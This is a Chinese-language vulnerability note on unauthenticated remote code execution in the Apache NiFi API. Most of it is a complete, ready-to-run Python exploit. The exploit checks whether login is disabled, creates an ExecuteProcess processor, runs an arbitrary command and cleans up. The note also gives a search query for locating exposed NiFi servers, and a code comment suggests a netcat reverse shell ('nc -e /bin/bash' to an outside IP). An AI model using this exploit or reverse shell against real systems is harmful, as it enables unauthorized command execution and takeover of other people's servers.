# Apache NiFi Api 远程代码执行 RCE

## 漏洞描述

Apache NiFi是Apache Software Foundation的一个软件项目，旨在使软件系统之间的数据流自动化。

参考链接：

- https://twitter.com/chybeta/status/1333341820596568065
- https://github.com/imjdl/Apache-NiFi-Api-RCE
- https://forum.ywhack.com/thread-114763-1-3.html

## 网络测绘

```
"nifi" && title=="NiFi"
```

## 漏洞复现

exp：

```python
import sys
import json
import requests as req


class Exp:
    def __init__(self, url):
        self.url = url

    def check_is_vul(self):
        url = self.url + "/nifi-api/access/config"
        try:
            res = req.get(url=url, verify=False)
            data = res.json()
            return not data["config"]["supportsLogin"]
        except Exception as e:
            pass
        return False

    def clean_up(self, p_id):
        url = self.url + "/nifi-api/processors/" + p_id + "/run-status"
        data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
        req.put(url=url, data=json.dumps(data), verify=False)
        req.delete(url + "/threads", verify=False)

    def exploit(self, cmd):
        g_id = self.fetch_process_group()
        if g_id:
            p_id = self.create_process(g_id)
            if p_id:
                self.run_cmd(p_id=p_id, cmd=cmd)
                self.clean_up(p_id=p_id)

    def run_cmd(self, p_id, cmd):
        url = self.url + "/nifi-api/processors/" + p_id
        cmd = cmd.split(" ")
        data = {
            'component': {
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'properties': {
                        'Command': cmd[0],
                        'Command Arguments': " ".join(cmd[1:]),
                    },
                    'schedulingPeriod': '3600 sec'
                },
                'id': p_id,
                'state': 'RUNNING'
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        print(data)
        headers = {
            "Content-Type": "application/json",
        }
        res = req.put(url=url, data=json.dumps(data), headers=headers, verify=False)
        return res.json()

    def fetch_process_group(self):
        url = self.url + "/nifi-api/process-groups/root"
        try:
            res = req.get(url=url, verify=False)
            data = res.json()["id"]
            return data
        except Exception as e:
            pass
        return 0

    def create_process(self, process_group_id):
        url = self.url + "/nifi-api/process-groups/" + process_group_id + "/processors"
        data = {
            'component': {
                'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
            },
            'revision': {
                'version': 0
            }
        }
        headers = {
            "Content-Type": "application/json",
        }
        try:
            res = req.post(url=url, data=json.dumps(data), headers=headers, verify=False)
            return res.json()["id"]
        except Exception as e:
            pass
        return 0


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("rce.py url cmd")
    else:
        url = sys.argv[1]  # http://192.168.1.1:8080
        cmd = sys.argv[2]  # nc -e /bin/bash 192.168.1.129 1234
        e = Exp(url)
        e.exploit(cmd)

```

msf模块：

https://packetstormsecurity.com/files/160260/apache_nifi_processor_rce.rb.txt